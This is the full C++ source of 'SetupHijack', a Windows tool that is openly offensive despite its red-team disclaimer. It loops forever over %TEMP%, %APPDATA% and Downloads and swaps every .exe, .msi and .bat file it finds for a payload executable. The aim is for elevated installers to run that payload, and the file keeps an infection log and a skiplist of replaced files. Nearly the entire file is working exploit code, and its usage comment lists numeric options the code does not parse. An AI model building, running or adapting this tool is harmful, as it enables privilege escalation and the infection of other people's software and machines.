
/* SetupHijack.cpp
 * ===============
 *
 * SetupHijack is a security research tool that exploits race conditions and insecure file 
 * handling in Windows installer and update processes.
 * 
 * It targets scenarios where privileged installers or updaters drop files in %TEMP% or 
 * %APPDATA% and %USERPROFILE%\Downloads, allowing an attacker to replace these files before 
 * they are executed with elevated privileges.
 *
 * Key Features:
 * - Does NOT require elevated permissions to run. (run in an Administrator session w/o UAC)
 * - Does NOT use file system notifications (polls for changes instead).
 * - Exploits weaknesses in Authenticode code signing and installer trust models.
 * - Can infect .exe, .msi, and .bat files (e.g., sysinfo, netstat, ipconfig).
 * - Maintains a persistent skiplist to avoid re-infecting the same files (by path+hash).
 * - Designed for red team, penetration testing, and security research use only.
 *
 * Usage (argument options):
 *   No argument:         Scan %TEMP%, %APPDATA%, and %USERPROFILE%\Downloads (default)
 *   -notemp:             Do not scan %TEMP%
 *   -noappdata:          Do not scan %APPDATA%
 *   -nodownloads:        Do not scan %USERPROFILE%\Downloads
 *   clean:               Clean mode, restore .bak backups in all enabled locations
 *   verbose:             Verbose mode, log all actions
 *   <payload path>:      Use specified payload for infection (unless argument is a recognized option)
 *
 * Example:
 *   SetupHijack.exe 3           // Scan both %TEMP% and %APPDATA%
 *   SetupHijack.exe 2           // Scan only %APPDATA%
 *   SetupHijack.exe 1           // Clean mode (restore .bak in %TEMP%)
 *   SetupHijack.exe verbose     // Verbose mode
 *   SetupHijack.exe <payload>   // Use custom payload
 *
 * Race conditions will vary; exploitation may not succeed on every attempt.
 * Use in a controlled environment and only with proper authorization.
 */

#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <shlwapi.h>
#include <shlobj.h> // For CSIDL_APPDATA and SHGetFolderPathW
#include <stdio.h>
#include <time.h>
#include <stdarg.h>
#include <cstdio>
#include <wchar.h>

#pragma comment(lib, "shlwapi.lib")

// Global infection tally
static int globalInfectionCount = 0;

// Logging helper
FILE* gLogFile = NULL;
void vlog(const wchar_t* fmt, ...) {
    if (!gLogFile) {
        _wfopen_s(&gLogFile, L"SetupHijack.log", L"a, ccs=UNICODE");
    }
    wchar_t buf[2048];
    va_list args;
    va_start(args, fmt);
    vswprintf(buf, 2048, fmt, args);
    va_end(args);
    // Timestamp
    time_t now = time(NULL);
    struct tm t;
    localtime_s(&t, &now);
    wchar_t ts[64];
    wcsftime(ts, 64, L"[%Y-%m-%d %H:%M:%S] ", &t);
    fwprintf(stdout, L"%s%s", ts, buf);
    if (gLogFile) fwprintf(gLogFile, L"%s%s", ts, buf);
    fflush(stdout);
    if (gLogFile) fflush(gLogFile);
}

// Recursively restore .exe/.msi/.bat files from .bak backups
void restoreBackups(const wchar_t* dir) {
    WIN32_FIND_DATAW fd;
    wchar_t searchPath[MAX_PATH];
    StringCchPrintfW(searchPath, MAX_PATH, L"%s\\*", dir);
    HANDLE hFind = FindFirstFileW(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            wchar_t subdir[MAX_PATH];
            PathCombineW(subdir, dir, fd.cFileName);
            restoreBackups(subdir);
        } else if (wcsstr(fd.cFileName, L".bak")) {
            wchar_t bakPath[MAX_PATH];
            PathCombineW(bakPath, dir, fd.cFileName);
            size_t bakLen = wcslen(bakPath);
            if (bakLen < 5) continue;
            // Remove .bak extension
            wchar_t origPath[MAX_PATH];
            wcsncpy_s(origPath, MAX_PATH, bakPath, _TRUNCATE);
            origPath[bakLen-4] = 0; // Truncate .bak
            // Remove any hijacked file first
            DeleteFileW(origPath);
            if (MoveFileW(bakPath, origPath)) {
                vlog(L"[SetupHijack] Restored: %s\n", origPath);
            } else {
                vlog(L"[SetupHijack] Failed to restore: %s (error %lu)\n", origPath, GetLastError());
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

// --- Add missing helpers and constants ---
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"c:\\Users\\Fantastic\\Desktop\\DEMO\\Renge_x64.exe"
#endif

// File extensions to hijack
const wchar_t* exts[] = { L".exe", L".msi", L".bat" };
#define EXT_COUNT (sizeof(exts)/sizeof(exts[0]))

// Helper: Check if file has a target extension (true suffix only, robust)
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
BOOL gVerbose = FALSE;
BOOL HasTargetExt(const wchar_t* filename) {
    const wchar_t* ext = PathFindExtensionW(filename);
    if (gVerbose) {
        vlog(L"[SetupHijack] Checking extension for: %s (ext: %s)\n", filename, ext ? ext : L"(null)");
    }
    if (!ext || !*ext) return FALSE;
    for (int i = 0; i < EXT_COUNT; ++i) {
        if (_wcsicmp(ext, exts[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// Helper: Wait for file to be unlocked
BOOL WaitForFile(const wchar_t* path) {
    for (int i = 0; i < 10; ++i) {
        HANDLE h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return TRUE;
        }
        Sleep(200);
    }
    return FALSE;
}

// Simple checksum hash for a file (not cryptographically secure, just for deduplication)
unsigned long SimpleFileHash(const wchar_t* path) {
    unsigned long hash = 0;
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    BYTE buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        for (DWORD i = 0; i < bytesRead; ++i) {
            hash = (hash * 33) ^ buffer[i];
        }
    }
    CloseHandle(hFile);
    return hash;
}

// Persistent skiplist for already hijacked files (by path+hash)
#define MAX_HIJACKED 4096
typedef struct {
    wchar_t path[MAX_PATH];
    unsigned long hash;
} HijackedEntry;
static HijackedEntry hijackedEntries[MAX_HIJACKED];
static int hijackedCount = 0;

#define SKIPLIST_FILENAME L"SetupHijack.skiplist"

void LoadSkipList() {
    FILE* f = NULL;
    _wfopen_s(&f, SKIPLIST_FILENAME, L"rb");
    if (!f) return;
    fread(&hijackedCount, sizeof(int), 1, f);
    if (hijackedCount > MAX_HIJACKED) hijackedCount = MAX_HIJACKED;
    fread(hijackedEntries, sizeof(HijackedEntry), hijackedCount, f);
    fclose(f);
}
void SaveSkipList() {
    FILE* f = NULL;
    _wfopen_s(&f, SKIPLIST_FILENAME, L"wb");
    if (!f) return;
    fwrite(&hijackedCount, sizeof(int), 1, f);
    fwrite(hijackedEntries, sizeof(HijackedEntry), hijackedCount, f);
    fclose(f);
}

int IsFileHijacked(const wchar_t* path, unsigned long hash) {
    for (int i = 0; i < hijackedCount; ++i) {
        if (hijackedEntries[i].hash == hash && _wcsicmp(hijackedEntries[i].path, path) == 0) return 1;
    }
    return 0;
}

void AddHijackedFile(const wchar_t* path, unsigned long hash) {
    if (!IsFileHijacked(path, hash) && hijackedCount < MAX_HIJACKED) {
        wcsncpy_s(hijackedEntries[hijackedCount].path, MAX_PATH, path, _TRUNCATE);
        hijackedEntries[hijackedCount].hash = hash;
        hijackedCount++;
        SaveSkipList();
    }
}

// Recursive function to scan directories (with payload argument and verbose logging)
void scanDir(const wchar_t* dir, const wchar_t* payloadPath, int verbose) {
    WIN32_FIND_DATAW fd;
    wchar_t searchPath[MAX_PATH];
    StringCchPrintfW(searchPath, MAX_PATH, L"%s\\*", dir);
    HANDLE hFind = FindFirstFileW(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        if (verbose) vlog(L"[SetupHijack] Warning: Cannot access directory: %s (error %lu)\n", dir, GetLastError());
        return;
    }
    int skipCount = 0;
    int infectCount = 0;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            if (verbose) vlog(L"[SetupHijack] Skipping (hidden/system): %s/%s\n", dir, fd.cFileName);
            continue;
        }
        if (wcsstr(fd.cFileName, L".bak") != NULL) continue;
        wchar_t fullPath[MAX_PATH];
        // Robust manual join: always add separator if needed
        size_t dirLen = wcslen(dir);
        if (dirLen > 0 && dir[dirLen-1] != L'\\') {
            StringCchPrintfW(fullPath, MAX_PATH, L"%s\\%s", dir, fd.cFileName);
        } else {
            StringCchPrintfW(fullPath, MAX_PATH, L"%s%s", dir, fd.cFileName);
        }
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            __try {
                scanDir(fullPath, payloadPath, verbose);
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                if (verbose) vlog(L"[SetupHijack] Warning: Exception scanning directory: %s\n", fullPath);
            }
        } else if (HasTargetExt(fd.cFileName)) {
            unsigned long hash = 0;
            __try {
                hash = SimpleFileHash(fullPath);
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                if (verbose) vlog(L"[SetupHijack] Warning: Exception hashing file: %s\n", fullPath);
                continue;
            }
            if (IsFileHijacked(fullPath, hash)) {
                if (verbose && skipCount < 10) {
                    vlog(L"[SetupHijack] Skipping (already hijacked): %s\n", fullPath);
                }
                skipCount++;
                continue;
            }
            const wchar_t* ext = wcsrchr(fd.cFileName, L'.');
            const wchar_t* payload = payloadPath;
            if (ext) {
                if (_wcsicmp(ext, L".msi") == 0) {
                    payload = L"install.msi";
                } else if (_wcsicmp(ext, L".bat") == 0) {
                    payload = L"install.bat";
                }
            }
            WIN32_FILE_ATTRIBUTE_DATA origAttr, payAttr;
            if (GetFileAttributesExW(fullPath, GetFileExInfoStandard, &origAttr) &&
                GetFileAttributesExW(payload, GetFileExInfoStandard, &payAttr)) {
                if (origAttr.nFileSizeLow == payAttr.nFileSizeLow && origAttr.nFileSizeHigh == payAttr.nFileSizeHigh) {
                    // Do NOT add to skiplist here; only add after a real hijack
                    continue;
                }
            }
            if (WaitForFile(fullPath)) {
                // Only log infection in default mode, or all actions in verbose
                if (verbose) vlog(L"[SetupHijack] Infecting: %s with payload: %s\n", fullPath, payload);
                wchar_t backup[MAX_PATH];
                StringCchPrintfW(backup, MAX_PATH, L"%s.bak", fullPath);
                if (!MoveFileW(fullPath, backup)) {
                    if (verbose) vlog(L"[SetupHijack] Warning: Cannot backup file: %s (error %lu)\n", fullPath, GetLastError());
                    continue;
                }
                if (!CopyFileW(payload, fullPath, FALSE)) {
                    if (verbose) vlog(L"[SetupHijack] Warning: Cannot copy payload to: %s (error %lu)\n", fullPath, GetLastError());
                    continue;
                }
                vlog(L"[SetupHijack] Replaced %s with payload %s, backup: %s\n", fullPath, payload, backup);
                AddHijackedFile(fullPath, hash);
                infectCount++;
                globalInfectionCount++;
            } else if (verbose) {
                vlog(L"[SetupHijack] Warning: Could not get access to file: %s (error %lu)\n", fullPath, GetLastError());
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    if (infectCount > 0) {
        vlog(L"[SetupHijack] New infections this run: %d\n", infectCount);
    }
}

// Main monitoring loop
int wmain() {


    wchar_t scanPath[MAX_PATH];      // %TEMP%
    wchar_t scanPath2[MAX_PATH];     // %APPDATA%
    wchar_t scanPath3[MAX_PATH];     // %USERPROFILE%\Downloads
    BOOL useTemp = TRUE, useAppData = TRUE, useDownloads = TRUE;
    int verbose = 0;
    BOOL cleanMode = FALSE;
    static wchar_t payloadPath[MAX_PATH] = PAYLOAD_PATH;
    scanPath[0] = scanPath2[0] = scanPath3[0] = 0;

    // Default: scan all three
    GetTempPathW(MAX_PATH, scanPath);
    HRESULT hr2 = SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, scanPath2);
    DWORD len3 = GetEnvironmentVariableW(L"USERPROFILE", scanPath3, MAX_PATH);
    if (len3 > 0 && len3 < MAX_PATH && wcslen(scanPath3) + 10 < MAX_PATH) {
        wcscat_s(scanPath3, MAX_PATH, L"\\Downloads");
    } else {
        scanPath3[0] = 0;
        useDownloads = FALSE;
    }

    // Parse arguments
    for (int i = 1; i < __argc; ++i) {
        if (_wcsicmp(__wargv[i], L"verbose") == 0) {
            verbose = 1;
        } else if (_wcsicmp(__wargv[i], L"clean") == 0) {
            cleanMode = TRUE;
        } else if (_wcsicmp(__wargv[i], L"-notemp") == 0) {
            useTemp = FALSE;
        } else if (_wcsicmp(__wargv[i], L"-noappdata") == 0) {
            useAppData = FALSE;
        } else if (_wcsicmp(__wargv[i], L"-nodownloads") == 0) {
            useDownloads = FALSE;
        } else if (wcslen(__wargv[i]) < MAX_PATH) {
            // Only set payload if not a recognized option
            wcsncpy_s(payloadPath, MAX_PATH, __wargv[i], _TRUNCATE);
        }
    }

    // Remove trailing backslash unless root (e.g., C:\)
    if (useTemp) {
        size_t len = wcslen(scanPath);
        if (len > 3 && scanPath[len-1] == L'\\') scanPath[len-1] = 0;
    }
    if (useAppData) {
        size_t len2 = wcslen(scanPath2);
        if (len2 > 3 && scanPath2[len2-1] == L'\\') scanPath2[len2-1] = 0;
    }
    if (useDownloads) {
        size_t len3b = wcslen(scanPath3);
        if (len3b > 3 && scanPath3[len3b-1] == L'\\') scanPath3[len3b-1] = 0;
    }

    LoadSkipList();

    // CLEAN mode: restore in all enabled locations
    if (cleanMode) {
        if (useTemp && scanPath[0]) {
            vlog(L"[SetupHijack] Running in CLEAN mode. Restoring .bak files in %s ...\n", scanPath);
            restoreBackups(scanPath);
        }
        if (useAppData && scanPath2[0]) {
            vlog(L"[SetupHijack] Also restoring .bak files in %s ...\n", scanPath2);
            restoreBackups(scanPath2);
        }
        if (useDownloads && scanPath3[0]) {
            vlog(L"[SetupHijack] Also restoring .bak files in %s ...\n", scanPath3);
            restoreBackups(scanPath3);
        }
        vlog(L"[SetupHijack] CLEAN complete.\n");
        if (gLogFile) fclose(gLogFile);
        return 0;
    }

    vlog(L"[SetupHijack] Using payload: %s\n", payloadPath);
    vlog(L"[SetupHijack] If infecting .msi, will use: install.msi\n");
    vlog(L"[SetupHijack] Polling enabled locations recursively for .exe, .msi, .bat:\n");
    if (useTemp && scanPath[0]) vlog(L"  - %s\n", scanPath);
    if (useAppData && scanPath2[0]) vlog(L"  - %s\n", scanPath2);
    if (useDownloads && scanPath3[0]) vlog(L"  - %s\n", scanPath3);

    int lastGlobalInfectionCount = -1;
    vlog(L"[SetupHijack] Entering infection loop.\n");
    __try {
        while (TRUE) {
            if (useTemp && scanPath[0]) scanDir(scanPath, payloadPath, verbose);
            if (useAppData && scanPath2[0]) scanDir(scanPath2, payloadPath, verbose);
            if (useDownloads && scanPath3[0]) scanDir(scanPath3, payloadPath, verbose);
            if (globalInfectionCount != lastGlobalInfectionCount) {
                vlog(L"[SetupHijack] Total infections this session: %d\n", globalInfectionCount);
                lastGlobalInfectionCount = globalInfectionCount;
            }
            Sleep(1000); // Poll every second
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        vlog(L"[SetupHijack] FATAL: Unhandled exception occurred. Exiting.\n");
    }
    vlog(L"[SetupHijack] Exited infection loop.\n");
    if (gLogFile) fclose(gLogFile);
    return 0;
}
